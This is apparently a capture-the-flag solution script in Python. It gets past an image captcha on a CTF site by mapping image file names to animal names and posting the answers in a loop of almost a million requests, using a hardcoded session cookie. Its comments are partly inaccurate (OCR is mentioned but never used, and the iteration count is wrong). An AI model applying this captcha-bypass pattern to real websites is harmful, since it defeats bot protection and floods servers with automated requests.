import base64
import io
import time
import requests
from bs4 import BeautifulSoup
from PIL import Image
import pytesseract

test_headers = {}
test_headers["Cookie"] = "PHPSESSID=gigo6gg64v2a15q50e5gg7kle8; f873062f0559114b30a8e84091decac1=4ca691cc8d4068943ebf5dd4b3ba2296"

image_to_animal_dict ={
"148627088915C721CCEBB4C611B859031037E6AD.jpeg": "snake",
"9E05E6832CAFFCA519722B608570B8FF4935B94D.jpeg": "mouse",
"FF0F0A8B656F0B44C26933ACD2E367B6C1211290.jpeg": "fox",
"C29E4D9C8824409119EAA8BA182051B89121E663.jpeg": "eagle",
"091B5035885C00170FEC9ECF24224933E3DE3FCC.jpeg": "horse",
"5ECE240085B9AD85B64896082E3761C54EF581DE.jpeg": "duck",
"09F5EDEB4F5B2A4E4364F6B654682C6758A3FA16.jpeg": "bear",
"E49512524F47B4138D850C9D9D85972927281DA0.jpeg": "dog",
"9D989E8D27DC9E0EC3389FC855F142C3D40F0C50.jpeg": "cat",
"73335C221018B95C013FF3F074BD9E8550E8D48E.jpeg": "penguin",
"6D0EBBBDCE32474DB8141D23D2C01BD9628D6E5F.jpeg": "rabbit"
}

request_url = 'https://captcha2.uctf.ir/'  # Replace with the actual URL you want to use
# Perform the process 100 times
for _ in range(999999):

    if _ == 0:
        # URL to connect to
        payload = {'captcha': "1"}  # Modify this payload as needed
        post_response = requests.post(request_url, data=payload, headers=test_headers)
        
        init_header = post_response.headers

    elif _ == 999998:
        _ = 1
        
    else:
        # Step 2: Parse the HTML content to find the image tag
        soup = BeautifulSoup(post_response.text, 'html.parser')
        img_tag = soup.find_all('img')

        # Check if an image tag was found
        payload = ""
        if img_tag:
            # Step 3: Extract the base64-encoded image data from the img tag
            for i in img_tag:
                img_data = i.get('src')
                payload += image_to_animal_dict[img_data]
                payload += '-'
            payload = payload[:-1]
            # Step 5: Submit back to the URL (assuming you need to POST the OCR result)
            payload = {'captcha': payload}  # Modify this payload as needed
            post_response = requests.post(request_url, data=payload, headers=test_headers)

            # Step 6: Wait for the response and handle it as needed
            if post_response.status_code == 200:
                print(f"OCR result successfully submitted: {payload}")
                soup = BeautifulSoup(post_response.text, 'html.parser')
                h4_tag = soup.find_all('h4')
                print(f"Response Content: {h4_tag}")
            else:
                print(f"Failed to submit OCR result. Status code: {post_response.status_code}")
                
        else:
            print("No image found in the HTML content")

            # Optional: Add a delay between iterations to avoid overloading the server
            #time.sleep(1)  # Adjust the delay as needed
